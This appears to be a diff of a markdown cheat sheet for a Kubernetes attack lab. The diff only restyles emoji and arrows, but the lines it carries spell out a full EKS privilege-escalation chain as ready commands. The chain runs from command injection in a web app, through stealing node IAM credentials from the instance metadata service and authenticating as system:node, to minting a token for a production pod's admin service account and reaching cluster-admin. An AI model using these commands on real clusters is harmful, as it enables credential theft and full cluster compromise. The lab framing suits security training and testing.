@@ -1,6 +1,6 @@
 # Scenario 1 — EKS Privilege Escalation Cheat Sheet
 
-**RCE → IMDSv2 → Node Creds → Pod Impersonation → Cluster-Admin**
+**RCE -> IMDSv2 -> Node Creds -> Pod Impersonation -> Cluster-Admin**
 
 ---
 
@@ -10,7 +10,7 @@
 http://<LB_HOST>/check?host=;id
 ```
 
-✅ Remote code execution inside the pod (as `appuser`)
+Status: Remote code execution inside the pod (as `appuser`)
 
 ---
 
@@ -21,7 +21,7 @@ http://<LB_HOST>/check?host=;id
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && echo $TOKEN
 ```
 
-✅ IMDSv2 session token (hop limit = 2 is commonly configured on EKS nodes)
+Status: IMDSv2 session token (hop limit = 2 is commonly configured on EKS nodes)
 
 ---
 
@@ -37,7 +37,7 @@ http://<LB_HOST>/check?host=;id
     http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
 ```
 
-✅ AWS AccessKeyId, SecretAccessKey, and Session Token for the EC2 node
+Status: AWS AccessKeyId, SecretAccessKey, and Session Token for the EC2 node
 
 ---
 
@@ -52,7 +52,7 @@ http://<LB_HOST>/check?host=;id
 aws ec2 describe-tags --filters "Name=resource-id,Values=<INSTANCE_ID>" --output table
 ```
 
-✅ Know which node we're on + discover prod workloads share this node
+Status: Know which node we're on + discover prod workloads share this node
 
 ---
 
@@ -65,7 +65,7 @@ export AWS_SESSION_TOKEN="<Token>"
 aws sts get-caller-identity
 ```
 
-✅ Confirmed identity as the EKS worker node IAM role
+Status: Confirmed identity as the EKS worker node IAM role
 
 ---
 
@@ -75,7 +75,7 @@ aws sts get-caller-identity
 EKS_TOKEN=$(aws eks get-token --cluster-name eks-attacks-lab | jq -r '.status.token')
 ```
 
-✅ Kubernetes bearer token with `system:node` privileges
+Status: Kubernetes bearer token with `system:node` privileges
 
 ---
 
@@ -96,7 +96,7 @@ kubectl config use-context attack
 kubectl auth whoami
 ```
 
-✅ kubectl authenticated as `system:node` — the node name is in the Username field
+Status: kubectl authenticated as `system:node` — the node name is in the Username field
 
 ---
 
@@ -108,7 +108,7 @@ NODE_NAME=$(kubectl auth whoami -o jsonpath='{.status.userInfo.username}' | sed 
 kubectl get pods --all-namespaces -o wide --field-selector spec.nodeName=$NODE_NAME
 ```
 
-✅ Discovered `payment-processor` pod in `prod` namespace on our node
+Status: Discovered `payment-processor` pod in `prod` namespace on our node
 
 ---
 
@@ -119,7 +119,7 @@ kubectl get -n prod pod/payment-processor -o jsonpath='{.spec.serviceAccountName
 # prod-admin-sa
 ```
 
-✅ Found a potentially privileged service account bound to the pod
+Status: Found a potentially privileged service account bound to the pod
 
 ---
 
@@ -129,7 +129,7 @@ kubectl get -n prod pod/payment-processor -o jsonpath='{.spec.serviceAccountName
 POD_UID=$(kubectl get pod payment-processor -n prod -o jsonpath='{.metadata.uid}')
 ```
 
-✅ Got the bound-object UID needed for token request
+Status: Got the bound-object UID needed for token request
 
 ---
 
@@ -142,7 +142,7 @@ SA_TOKEN=$(kubectl create token prod-admin-sa -n prod \
   --bound-object-uid="$POD_UID")
 ```
 
-✅ NodeRestriction allows this — node can request tokens for any pod on itself
+Status: NodeRestriction allows this — node can request tokens for any pod on itself
 
 ---
 
@@ -163,7 +163,7 @@ kubectl auth can-i '*' '*' --token=$(cat token)
 kubectl config set-credentials attack-node --token="$SA_TOKEN"
 ```
 
-✅ **Full cluster-admin access verified — cluster compromised**
+Status: Full cluster-admin access verified — cluster compromised
 
 ---
 
@@ -174,7 +174,7 @@ kubectl config set-credentials attack-node --token="$SA_TOKEN"
 | 1 | RCE | Command injection in web app |
 | 2–3 | Steal node creds | IMDSv2 from pod (hop limit = 2, common config) |
 | 4 | Recon | EC2 tags reveal prod workloads |
-| 5–7 | Become system:node | IAM creds → EKS token → kubectl |
+| 5–7 | Become system:node | IAM creds -> EKS token -> kubectl |
 | 8 | Find target pod | `--field-selector spec.nodeName=` lists pods on our node |
 | 9 | Enumerate SA | Get service account name from the pod |
 | 10 | Get pod UID | Needed for bound-object token request |
